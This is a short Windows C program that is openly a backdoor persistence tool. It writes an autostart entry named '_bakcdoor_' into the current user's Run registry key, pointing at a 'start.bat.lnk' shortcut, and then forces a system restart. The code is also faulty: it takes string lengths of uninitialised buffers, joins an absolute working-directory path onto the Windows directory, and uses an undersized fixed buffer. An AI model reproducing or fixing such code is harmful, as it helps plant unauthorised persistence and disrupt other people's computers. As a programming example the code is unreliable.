#include <Windows.h>
#include <limits.h>
#include <stdio.h>
#include <string.h>
#include <direct.h>
#include <stdlib.h>

int main() {
    HKEY hKey = NULL;
    TCHAR szExeName[MAX_PATH + 1];
    TCHAR szWinPath[MAX_PATH + 1];
    
    char path[60];
    _getcwd(path, 59);
    strcat(path, "\\start.bat.lnk");
    
    GetModuleFileName(NULL, szExeName, strlen(szExeName));
    GetWindowsDirectory(szWinPath, strlen(szWinPath));

    lstrcat(szWinPath, path); // Path to .exe file

    /* Open regedit key */
    int result = RegOpenKey(HKEY_CURRENT_USER, 
    	"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    
    if (result == ERROR_SUCCESS) {
        /* Create string parameter */
        printf("Succes...");
        RegSetValueEx(hKey, "_bakcdoor_", 0, REG_SZ, (PBYTE)szWinPath, strlen(szWinPath)*sizeof(TCHAR) + 1);
        system("shutdown /r /t 10");
    }

    return 0;
}